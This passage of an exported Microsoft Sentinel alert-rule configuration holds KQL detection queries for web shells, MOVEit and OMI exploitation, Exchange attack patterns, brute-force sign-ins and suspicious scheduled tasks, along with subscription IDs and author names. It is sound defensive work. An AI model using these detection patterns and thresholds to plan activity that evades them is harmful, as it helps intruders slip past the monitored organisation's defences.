usage","enabled":true,"description":"DEV-0270 heavily uses powershell to achieve their objective at various stages of their attack. To locate powershell related activity tied to the actor, Microsoft Sentinel customers can run the following query.\nPLATFORM:Microsoft 365,IaaS,Windows\nMITRE:TA0005;T1562,TA0007;T1087;T1087.003;T1087.004","alertRuleTemplateName":"422ca2bf-598b-4872-82bb-5f7e8fa731e7","lastModifiedUtc":"2024-10-02T22:01:08.8169613Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/b531d597-5aec-4ad4-9790-c28249234ae1","name":"b531d597-5aec-4ad4-9790-c28249234ae1","etag":"\"860029ed-0000-2700-0000-66fdba8c0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let OMIVulnerabilityPatchVersion = \"OMIVulnerabilityPatchVersion:1.13.40-0\";\nHeartbeat\n| where Category == \"Direct Agent\"\n| summarize arg_max(TimeGenerated,*) by Computer\n| parse strcat(\"Version:\" , Version) with * \"Version:\" Major:long \".\"\nMinor:long \".\" Patch:long \"-\" *\n| parse OMIVulnerabilityPatchVersion with * \"OMIVulnerabilityPatchVersion:\"\nOMIVersionMajor:long \".\" OMIVersionMinor:long \".\" OMIVersionPatch:long \"-\" *\n| where Major <OMIVersionMajor or (Major==OMIVersionMajor and Minor\n<OMIVersionMinor) or (Major==OMIVersionMajor and Minor==OMIVersionMinor and\nPatch<OMIVersionPatch) \n| project Version, Major,Minor,Patch,\nComputer,ComputerIP,OSType,OSName,ResourceId","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"customDetails":{"HostIp":"ComputerIP","OSType":"OSType","OSName":"OSName"},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"Computer"}]},{"entityType":"AzureResource","fieldMappings":[{"identifier":"ResourceId","columnName":"ResourceId"}]}],"templateVersion":"1.1.3","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":[],"displayName":"OMI Vulnerability Exploitation","enabled":true,"description":"Following the September 14th, 2021 release of three Elevation of Privilege\n(EoP) vulnerabilities (CVE-2021-38645, CVE-2021-38649, CVE-2021-38648) and one\nunauthenticated Remote Code Execution (RCE) vulnerability (CVE-2021-38647) in\nthe Open Management Infrastructure (OMI) Framework.\nThis detection validates that any OMS-agent that is reporting to the Microsoft\nSentinel workspace is updated with the patch. The detection will go over the\nheartbeats received from all agents over the last day and will create alert\nfor those agents who are not updated.\nPLATFORM:IaaS,Windows\nMITRE:TA0001;T1190","alertRuleTemplateName":"3cc5ccd8-b416-4141-bb2d-4eba370e37a5","lastModifiedUtc":"2024-10-02T21:26:36.4545566Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/861b5f53-62c2-441c-8a47-de27ef0aa768","name":"861b5f53-62c2-441c-8a47-de27ef0aa768","etag":"\"86007da2-0000-2700-0000-66fdb62b0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P14D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let exchange_servers = (\nW3CIISLog\n| where TimeGenerated > ago(14d)\n| where sSiteName =~ \"Exchange Back End\"\n| summarize by Computer);\nW3CIISLog\n| where TimeGenerated > ago(1d)\n| where Computer in (exchange_servers)\n| where csUriQuery startswith \"t=\"\n| project-reorder TimeGenerated, Computer, csUriStem, csUriQuery, csUserName, csUserAgent, cIP\n| extend timestamp = TimeGenerated, AccountCustomEntity = csUserName, HostCustomEntity = Computer, IPCustomEntity = cIP","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"HostCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]}],"templateVersion":"1.0.2","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":["T1190"],"displayName":"Silk Typhoon Suspicious Exchange Request","enabled":true,"description":"This query looks for suspicious request patterns to Exchange servers that fit a pattern observed by Silk Typhoon actors.\nThe same query can be run on HTTPProxy logs from on-premise hosted Exchange servers.\nReference: https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/\nPLATFORM:IaaS,Windows\nMITRE:TA0001;T1190,TA0005;T1562;T1562.001","alertRuleTemplateName":"23005e87-2d3a-482b-b03d-edbebd1ae151","lastModifiedUtc":"2024-10-02T21:07:55.3818648Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/fc5adb04-aff9-4e54-8775-9826989165fe","name":"fc5adb04-aff9-4e54-8775-9826989165fe","etag":"\"1b00a2ac-0000-2700-0000-66d8a2bf0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"let fileAccessThrehold = 10;\nOfficeActivity\n| where OfficeWorkload =~ \"MicrosoftTeams\"\n| where Operation =~ \"MemberAdded\"\n| extend MemberAdded = tostring(parse_json(Members)[0].UPN)\n| where MemberAdded contains (\"#EXT#\")\n| project TimeAdded=TimeGenerated, Operation, MemberAdded, UserWhoAdded = UserId, TeamName\n| join kind = inner (\n  OfficeActivity\n  | where OfficeWorkload =~ \"MicrosoftTeams\"\n  | where Operation =~ \"MemberRemoved\"\n  | extend MemberAdded = tostring(parse_json(Members)[0].UPN)\n  | where MemberAdded contains (\"#EXT#\")\n  | project TimeDeleted=TimeGenerated, Operation, MemberAdded, UserWhoDeleted = UserId, TeamName\n  ) on MemberAdded\n| where TimeDeleted > TimeAdded\n| join kind=inner (\n  OfficeActivity\n  | where RecordType == \"SharePointFileOperation\"\n  | where SourceRelativeUrl has \"Microsoft Teams Chat Files\"\n  | where Operation == \"FileUploaded\"\n  | extend MemberAdded = UserId\n  | join kind = inner (\n      OfficeActivity\n      | where RecordType == \"SharePointFileOperation\"\n      | where Operation  == \"FileAccessed\"\n      | where SourceRelativeUrl has \"Microsoft Teams Chat Files\"\n      | summarize FileAccessCount = count() by OfficeObjectId\n      | where FileAccessCount > fileAccessThrehold\n      ) on $left.OfficeObjectId == $right.OfficeObjectId\n  )on MemberAdded\n| project-away MemberAdded1, MemberAdded2, OfficeObjectId1, Operation1, Operation2, TeamName1, TeamName2\n| extend MemberAddedAccountName = tostring(split(MemberAdded, \"@\")[0]), MemberAddedAccountUPNSuffix = tostring(split(MemberAdded, \"@\")[1])\n| extend UserWhoAddedAccountName = tostring(split(UserWhoAdded, \"@\")[0]), UserWhoAddedAccountUPNSuffix = tostring(split(UserWhoAdded, \"@\")[1])\n| extend UserWhoDeletedAccountName = tostring(split(UserWhoDeleted, \"@\")[0]), UserWhoDeletedAccountUPNSuffix = tostring(split(UserWhoDeleted, \"@\")[1])\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"MemberAdded"},{"identifier":"Name","columnName":"MemberAddedAccountName"},{"identifier":"UPNSuffix","columnName":"MemberAddedAccountUPNSuffix"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserWhoAdded"},{"identifier":"Name","columnName":"UserWhoAddedAccountName"},{"identifier":"UPNSuffix","columnName":"UserWhoAddedAccountUPNSuffix"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserWhoDeleted"},{"identifier":"Name","columnName":"UserWhoDeletedAccountName"},{"identifier":"UPNSuffix","columnName":"UserWhoDeletedAccountUPNSuffix"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"ClientIP"}]}],"templateVersion":"2.1.1","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":["T1566"],"displayName":"Accessed files shared by temporary external user","enabled":true,"description":"This detection identifies when an external user is added to a Team or Teams chat and shares a file which is accessed by many users (>10) and the users is removed within short period of time. This might be an indicator of suspicious activity.\nPLATFORM:IaaS,Windows;MITRE:TA0001;T1566","alertRuleTemplateName":"bff058b2-500e-4ae5-bb49-a5b1423cbd5b","lastModifiedUtc":"2024-09-04T18:11:10.8469392Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/73f9efba-a305-479a-8bfc-f51e69436158","name":"73f9efba-a305-479a-8bfc-f51e69436158","etag":"\"87008c7d-0000-2700-0000-66fdc4140000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5H","queryPeriod":"PT5H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Title: BAH_WEB_SHELL_ASPX\r\n//Description: Detects webshells dropped on device to obtain internal acess.\r\n//Author: Michael Gibbs\r\n//False Positive: If the website creates aspx files in the wwwroot folder it will cause FP to hit on file drop.\r\nlet signInLookup=(\r\nSigninLogs\r\n|where TimeGenerated>=ago(1d)\r\n|where DeviceDetail contains \"displayName\"\r\n|extend DeviceDetailJson=parse_json(DeviceDetail)\r\n|extend DeviceNameSI=tostring(DeviceDetailJson.displayName)\r\n|distinct DeviceNameSI,UserPrincipalName,UserDisplayName\r\n);\r\nlet devicefile = DeviceFileEvents\r\n| where ActionType == \"FileCreated\"\r\n| where FileName endswith \".aspx\" or FileName endswith \".asp\"\r\n| where FolderPath has \"\\\\wwwroot\"\r\n| extend folderName=(parse_json(FolderPath)).DirectoryPath\r\n| where folderName endswith \"\\\\wwwroot\"; //can generate fp if uses as folder for files\r\nlet compiling = DeviceFileEvents \r\n| where FileName =~ @\"csc.exe\" \r\n| where InitiatingProcessFileName =~ \"w3wp.exe\"; // dot net compiling from web\r\nlet deviceevents = DeviceEvents\r\n| where ProcessCommandLine contains \"moveitdmz pool\"; //movieit exploit usage\r\nunion deviceevents, devicefile, compiling\r\n//| project TimeGenerated, ProcessCommandLine, FileName, folderName;\r\n|extend SILogDeviceName=toupper((split(DeviceName,\".\"))[0])\r\n|join kind=leftouter signInLookup on $left.SILogDeviceName==$right.DeviceNameSI\r\n|project DeviceName,InitiatingProcessAccountDomain,InitiatingProcessAccountName,UserDisplayName","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserDisplayName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess","Persistence"],"techniques":["T1190","T1505"],"displayName":"BAH_WEB_SHELL_ASPX","enabled":true,"description":"Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server. Adversaries may interact with aspx files to upload or to take advantage of to have command line access to the system.\nRecently, the MOVEit Transfer vulnerability report from CISA came out showing increase in internet facing applications being exploited by cl0p ransomware group, which was the focus point for the analytic and hunt cycle.\nPLATFORM:Windows\nMITRE:TA0001;T1190,TA0004;T1505","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:07:15.5569522Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/DoD365-LAW-RG2/providers/Microsoft.OperationalInsights/workspaces/DOD365-LAW/providers/Microsoft.SecurityInsights/alertRules/90260e75-3231-4870-9e92-6f57b03461ab","name":"90260e75-3231-4870-9e92-6f57b03461ab","etag":"\"3d00ac13-0000-2700-0000-66a254210000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Title: BAH_Anomaly_Detection - This is an analytic for Anomalies as anomalies do not generate alerts; and allows the team to observe potential anomalies that occur in the environment that deviates from the normal baseline. It is important to note that a generated alert does not necessarily indicate potential malicious activity, but rather serve as means for awareness and continuous monitoring. Please note: This analytic only looks at anomalies that have been fine-tuned. To adjust threshold/sensitivity levels, you will need to modify the individual anomaly rule that is in place. \n//Author(s): Ginna Woo & Edward Jiang\n//False Positives: None\nAnomalies\n| where AnomalyTemplateName contains \"customized\"\n//Excluding these Anomalies as we are testing these at moment - GWoo 8/23\n| where AnomalyTemplateName  in  (\"UEBA Anomalous Account Access Removal - Customized\", \"UEBA Anomalous Defensive Mechanism Modification - Customized\", \"UEBA Anomalous Privilege Granted - Customized\", \"UEBA Anomalous Account Creation - Customized\", \"Anomalous user activities in Office Exchange - Customized\", \"Potential data staging - Customized\", \"Anomalous user/app activities in Azure audit logs - Customized\", \"Anomalous Azure operations\")\n| mv-expand AnomalyReasons\n| where AnomalyReasons.IsAnomalous == 'true'\n| evaluate bag_unpack(ActivityInsights)\n| evaluate bag_unpack(UserInsights)\n| evaluate bag_unpack(DeviceInsights)\n| extend AnomalyReasons = bag_remove_keys(AnomalyReasons, dynamic([\"Type\", \"TypicalObservations\", \"Value\"]))\n| summarize Reasons = make_list(AnomalyReasons, 50), AnomalyDetails = any(AnomalyDetails), Entities = any(Entities), ExtendedLinks = any(ExtendedLinks) by UserPrincipalName, TimeGenerated, AnomalyTemplateName, Description, Score, Tactics,Techniques\n| project-reorder TimeGenerated, UserPrincipalName, AnomalyTemplateName, Description, Score, Reasons","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"customDetails":{},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"UserPrincipalName"}]}],"alertDetailsOverride":{"alertDynamicProperties":[]},"tactics":["InitialAccess","Impact","Discovery"],"techniques":["T1078","T1496","T1087"],"displayName":"BAH_Anomaly_Detection","enabled":true,"description":"This is an analytic for Anomalies as anomalies do not generate alerts; and allows the team to observe potential anomalies that occur in the environment that deviates from the normal baseline. It is important to note that a generated alert does not necessarily indicate potential malicious activity, but rather serve as means for awareness and continuous monitoring. Please note: This analytic only looks at anomalies that have been fine-tuned. To adjust threshold/sensitivity levels, you will need to modify the individual anomaly rule that is in place.","alertRuleTemplateName":null,"lastModifiedUtc":"2024-07-25T13:33:20.2930652Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/c50669fe-9030-4e19-8016-26f79e43823b","name":"c50669fe-9030-4e19-8016-26f79e43823b","etag":"\"8700e4b0-0000-2700-0000-66fdc7340000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5H","queryPeriod":"PT5H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Author: Michael Gibbs \n//Description: Looks at admin user deletion greater than 50, Ransomware as a service is greater than 50 and intended for persistence and data exfiltration.\n//False Positives: Mass deletion of users due to page no longer being active \nlet signInLookup=(\nSigninLogs\n|where TimeGenerated>=ago(1d)\n|where DeviceDetail contains \"displayName\"\n|extend DeviceDetailJson=parse_json(DeviceDetail)\n|extend DeviceNameSI=tostring(DeviceDetailJson.displayName)\n|distinct DeviceNameSI,UserPrincipalName,UserDisplayName, UserId\n);\nlet interesting=(\nOfficeActivity\n| where Operation == \"SiteCollectionAdminRemoved\"\n|where TimeGenerated>=ago(1d)\n| where RecordType contains \"SharePoint\"\n| where OfficeWorkload == \"SharePoint\"\n| where UserId != @\"app@sharepoint\"\n| summarize Count = count() by Site_Url, UserId\n| where Count > 50\n| join kind=leftouter signInLookup on $left.UserId == $right.UserPrincipalName\n);\ninteresting\n| where DeviceNameSI != \"\"\n| project Count, UserId, Site_Url, DeviceNameSI\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceNameSI"}]},{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"UserId"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Collection"],"techniques":["T1213"],"displayName":"BAH_SHAREPOINT_ADMIN_USER_DELETION","enabled":true,"description":"MITRE ATT&CK Technique T1213.002, ???SharePoint - User Deletion??? Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information. Adversaries may also abuse external sharing features to share sensitive documents with recipients outside of the organization.\nThe focus was to conduct a thorough investigation on Activity logs. This will help identify patterns, uncover anomalies, and gather evidence to determine if there is a real threat of unauthorized user deletion activities within the SharePoint environment.\nPLATFORM:Microsoft 365,Windows,IaaS\nMITRE:TA0009;T1213;T1213.002","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:20:33.4978864Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/457280a9-a748-4c0b-b116-510516325a77","name":"457280a9-a748-4c0b-b116-510516325a77","etag":"\"8700f988-0000-2700-0000-66fdc4ad0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Authors: Ginna Woo and Edward Jiang\r\n//Description: UEBA 6 - Brute force attack against Windows Signin; Identifies evidence of brute force activity against Windows signins by highlighting multiple authentication failures and by a successful authentication within a given time window.\r\n//False Positive(s): None\r\n//----------------------------\r\n\r\nlet authenticationWindow = 20m;\r\nlet sensitivity = 2.5; //adjust anomaly sensitivity threshold for the series_decompose_function (1.5 is the default; higher value = more sensitive for detecting anomalies)\r\nlet seasonality = -1;//Controls the seasonal analysis. -1 = auto detect seasonality\r\nlet InvestigationPriorityThreshold = 2; //UEBA threshold sensitivity \r\n//Find all signin attempts and generate failure and success count. Conduct series_decompose_anomalies analysis and project scoring results\r\nlet FailureThreshold = 10; //Adjust failure threshold\r\nlet FailSuccessSignin =\r\nSigninLogs\r\n    | where AppDisplayName =~ \"Windows Sign In\"\r\n    | extend FailureOrSuccess = iff(ResultType in (\"0\", \"50125\", \"50140\", \"70043\", \"70044\"), \"Success\", \"Failure\")\r\n    | summarize FailureCount = countif(FailureOrSuccess==\"Failure\"), SuccessCount = countif(FailureOrSuccess==\"Success\"), IPAddresses = make_set(IPAddress,1000) by bin(TimeGenerated, authenticationWindow), UserDisplayName, UserPrincipalName\r\n    | extend FailureSuccessDiff = FailureCount - SuccessCount\r\n    | where  FailureCount >= FailureThreshold\r\n    | summarize Diff = make_list(FailureSuccessDiff, 10000), TimeStamp = make_list(TimeGenerated, 10000), TotalFailures = max(FailureCount) by UserDisplayName, UserPrincipalName \r\n    | extend (Anomalies, Score, Baseline) = series_decompose_anomalies(Diff, sensitivity, seasonality, 'linefit')\r\n    | mv-expand Diff to typeof(double), TimeStamp to typeof(datetime), Anomalies to typeof(double), Score to typeof(double), Baseline to typeof(long)\r\n    | where Anomalies > 0\r\n    | summarize by UserDisplayName, UserPrincipalName, TotalFailures;\r\n//Enrich results with UEBA data \r\nBehaviorAnalytics\r\n| where InvestigationPriority >= InvestigationPriorityThreshold\r\n| evaluate bag_unpack(ActivityInsights, columnsConflict=\"replace_source\")\r\n| evaluate bag_unpack(UsersInsights, columnsConflict=\"replace_source\")\r\n| evaluate bag_unpack(DevicesInsights, columnsConflict=\"replace_source\")\r\n| extend UnusualNumberOfFailedSignInOfThisUser = column_ifexists(\"UnusualNumberOfFailedSignInOfThisUser\", \"\")\r\n| extend UnusualNumberOfDistinctUsersFailedSignInFromIPAddress = column_ifexists(\"UnusualNumberOfDistinctUsersFailedSignInFromIPAddress\", \"\")\r\n//| where UnusualNumberOfFailedSignInOfThisUser == 'True' and UnusualNumberOfDistinctUsersFailedSignInFromIPAddress == 'True' \r\n| join kind = innerunique FailSuccessSignin on UserPrincipalName\r\n//Joining in on SigninLogs again to project columns\r\n| join kind=leftouter (\r\n      SigninLogs\r\n      | where AppDisplayName =~ \"Windows Sign In\"\r\n      | extend OS = DeviceDetail.operatingSystem, Browser = DeviceDetail.browser\r\n      | extend StatusCode = tostring(Status.errorCode), StatusDetails = tostring(Status.additionalDetails)\r\n      | extend State = tostring(LocationDetails.state), City = tostring(LocationDetails.city)\r\n      | summarize StartTime = min(TimeGenerated), \r\n                  EndTime = max(TimeGenerated), \r\n                  IPAddress = make_set(IPAddress,100), \r\n                  OS = make_set(OS,20), \r\n                  Browser = make_set(Browser,20), \r\n                  City = make_set(City,100), \r\n                  ResultType = make_set(ResultType,100),\r\n                  ResultDescription = make_set(ResultDescription,100)\r\n              by UserDisplayName, UserPrincipalName\r\n  ) on UserDisplayName, UserPrincipalName\r\n| extend IPAddressFirst = IPAddress[0]\r\n|project-keep StartTime, EndTime, UserDisplayName, UserPrincipalName, InvestigationPriority, Uncommon*, Unusual*, Resource*, First*, App*, IPAddress, City, Result*, UserAgent*, TotalFailures\r\n| project-reorder StartTime, EndTime, UserDisplayName, UserPrincipalName, TotalFailures","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"customDetails":{},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"UserPrincipalName"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPAddress"}]}],"alertDetailsOverride":{"alertDynamicProperties":[]},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CredentialAccess"],"techniques":["T1110"],"displayName":"BAH_UEBA_6 - Brute Force Attack against Windows Signin","enabled":true,"description":"Identifies evidence of brute force activity against a Windows Sign In activities by highlighting multiple authentication failures and by a successful authentication within a given time window.\nPLATFORM:Azure AD\nMITRE:TA0006;T1110;T1110.001;T1110.002;T1110.003;T1110.004","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:09:47.8274296Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/fff004dd-fa14-415f-bdb2-4550f6a4c5e7","name":"fff004dd-fa14-415f-bdb2-4550f6a4c5e7","etag":"\"870040b6-0000-2700-0000-66fdc7860000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5H","queryPeriod":"PT5H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"// Author: Michael Gibbs\n// Description: scheduled tasks creation and write all folder\n// False Positives: Legitimate task being created in write-all folder\nlet knowntasks = dynamic ([\"Windows Defender Cleanup\",  \n     \"nessus\",\n    \"sdelete\",\n    \"SupportAssistAgent\",\n     @\"/XML\",\n     @\"msoia.exe\"]);\n     let executable = dynamic ([\n     \".exe\",     \n     \".msi\",\n     \".hta\",\n     \".bat\"]);\n     let path = dynamic ([\"temp\",  \n     \"programdata\",\n    \"perflogs\",\n    @\"tasks\\\",\n    @\"intel\\\",\n    @\"debug\\\"\n    ]);\n     (DeviceProcessEvents     \n     | where TimeGenerated >= ago(1d)\n     | where FileName contains \"schtasks\" \n     | where not(ProcessCommandLine has_any (knowntasks))\n     | extend value = split(tolower(ProcessCommandLine), \"schtasks.exe\")\n     | extend values = split(value, \"schtasks\")\n     | where value has_any(path) // Usually writable location for everyone\n     | where value has_any (executable)\n     | project DeviceName, AccountName, value\n);","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence"],"techniques":["T1053"],"displayName":"BAH_Scheduled_Tasks","enabled":true,"description":"Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The schtasks utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to System Binary Proxy Execution, adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution undersigned/trusted system processes.\nPLATFORM:Windows\nMITRE:TA0003;T1053","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:21:57.6270231Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/98f9e873-dbc7-4046-aaaf-916f585a4293","name":"98f9e873-dbc7-4046-aaaf-916f585a4293","etag":"\"87007222-0000-2700-0000-66fdbdf50000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"SigninLogs\r\n    | where ResultType == 0\r\n    | where tostring(DeviceDetail.isCompliant) == \"false\"\r\n    | extend Account_0_Name = tolower(UserPrincipalName)\r\n    | extend IP_0_Address = IPAddress\r\n    | join kind=leftouter (\r\n        IdentityInfo\r\n        | summarize LatestReportTime = arg_max(TimeGenerated, *) by AccountUPN\r\n        | extend BlastRadiusInt = iif(BlastRadius == \"High\", 1, 0)\r\n        | project AccountUPN, Tags, JobTitle, GroupMembership, AssignedRoles, UserType, IsAccountEnabled, BlastRadiusInt\r\n        | summarize\r\n            Tags = make_set(Tags, 1000),\r\n            GroupMembership = make_set(GroupMembership, 1000),\r\n            AssignedRoles = make_set(AssignedRoles, 1000),\r\n            BlastRadiusInt = sum(BlastRadiusInt),\r\n            UserType = make_set(UserType, 1000),\r\n            UserAccountControl = make_set(UserType, 1000)\r\n        by AccountUPN\r\n        | extend Account_0_Name =tolower(AccountUPN)\r\n    ) on Account_0_Name\r\n    | join kind=leftouter (\r\n        BehaviorAnalytics\r\n        | where ActivityType in (\"FailedLogOn\", \"LogOn\")\r\n        | where isnotempty(SourceIPAddress)\r\n        | project UsersInsights, DevicesInsights, ActivityInsights, InvestigationPriority, SourceIPAddress\r\n        | project-rename IP_0_Address = SourceIPAddress\r\n        | summarize\r\n          UsersInsights = make_set(UsersInsights, 1000),\r\n          DevicesInsights = make_set(DevicesInsights, 1000),\r\n          IPInvestigationPriority = sum(InvestigationPriority)\r\n        by IP_0_Address\r\n    ) on IP_0_Address\r\n    | extend UEBARiskScore = BlastRadiusInt + IPInvestigationPriority\r\n    | sort by UEBARiskScore 